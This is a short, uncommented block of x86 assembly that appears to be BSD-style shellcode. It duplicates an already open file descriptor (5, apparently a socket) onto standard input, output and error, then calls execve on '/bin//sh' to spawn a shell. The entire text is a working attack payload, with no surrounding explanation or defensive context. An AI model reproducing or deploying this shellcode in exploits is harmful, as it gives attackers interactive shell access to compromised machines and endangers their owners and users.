xor ebx, ebx
mov bl, 0x5
xor eax, eax
push eax
push ebx
push eax
mov al, 0x5a
int 0x80

xor eax, eax
mov al, 0x1
push eax
push ebx
push eax
mov al, 0x5a
int 0x80

xor eax, eax
mov al, 0x2
push eax
push ebx
push eax
mov al, 0x5a
int 0x80

xor eax, eax
push eax
push 0x68732f2f
push 0x6e69622f
mov ebx, esp
push eax
push ebx
mov edx, esp
push eax
push edx
push ebx
push eax
mov al, 0x3b
int 0x80
